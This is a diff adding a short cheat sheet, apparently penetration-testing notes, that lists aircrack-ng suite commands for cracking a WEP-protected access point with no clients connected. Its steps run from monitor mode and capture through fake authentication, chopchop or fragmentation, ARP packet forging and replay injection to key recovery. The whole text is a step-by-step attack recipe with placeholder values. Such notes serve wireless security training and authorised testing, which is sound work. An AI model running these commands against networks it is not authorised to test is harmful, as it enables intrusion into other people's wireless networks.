@@ -1,0 +1,33 @@
+CLIENTLESS WEP ATTACK
+Clientless WEP Cracking Attack Summary
+----------------------------------------
+
+Place your wireless card into monitor mode on the channel number of the AP:
+
+airmon-ng start <interface> <AP channel>
+
+Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:
+
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+Conduct a fake authentication attack against the AP:
+
+aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+
+Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):
+
+aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
+
+Craft an ARP request packet using packetforge-ng:
+
+packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y
+<xor filename> -w <output filename>
+
+Inject the packet into the network using attack 2, the interactive packet replay attack:
+
+aireplay-ng -2 -r <packet filename> <interface>
+
+Crack the WEP key using Aircrack-ng:
+
+aircrack-ng <capture>
+
